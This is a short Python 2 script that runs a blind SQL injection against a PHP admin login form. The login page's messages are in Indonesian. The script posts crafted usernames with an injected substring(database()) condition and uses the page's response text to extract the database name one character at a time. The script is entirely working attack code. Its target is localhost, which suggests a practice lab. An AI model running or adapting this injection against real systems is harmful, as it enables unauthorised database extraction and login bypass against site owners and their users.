import requests
import sys

# URL Target
url = 'http://localhost/admin_login.php'
 
for i in range(1, 20):
  for c in range(0x20, 0x7f):
    username = "xxx' OR BINARY substring(database(),%d,1)= '%s'-- " %(i, chr(c))
    password = "12345"
            
    form = {'username': username, 'password': password, 'submit': 'Login'}
    response = requests.post(url, data=form)
     
    if "Halaman administrasi blog" in response.text:
      status = True
    elif "Username atau password salah!" in response.text:
      status = False
             
    if status == True:
      sys.stdout.write(chr(c))
      sys.stdout.flush()
      break
print ''
